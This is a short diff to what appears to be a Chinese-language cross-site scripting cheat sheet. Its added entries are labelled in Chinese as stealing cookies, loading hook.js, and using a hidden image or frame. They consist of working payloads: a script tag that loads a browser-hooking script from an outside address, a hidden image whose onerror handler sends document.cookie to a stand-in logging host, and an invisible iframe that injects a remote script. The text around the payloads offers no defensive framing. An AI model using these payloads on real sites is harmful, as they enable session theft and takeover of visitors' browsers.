@@ -14,3 +14,18 @@
 
 盗取cookie信息
 <script>alert(document.cookie)</script>
+
+引入hook.js
+<script src="http://192.168.10.14/hook.js"></script>
+
+隐藏图片盗取信息
+<img src=x onerror="var img = newImage();img.style.width = img.style.height = 0; img.src='http://www.xxx.com/log.php?c='+document.cookie">
+
+创建框架链接hook.js
+<script>
+  var f=document.createElement('iframe');
+  f.style.border=f.style.width=f.style.height='0';
+  document.body.appendChild(f);
+  f.contentWindow.document.write('<script src=http://192.168.10.13/hook.hs></script>')
+</script>
+
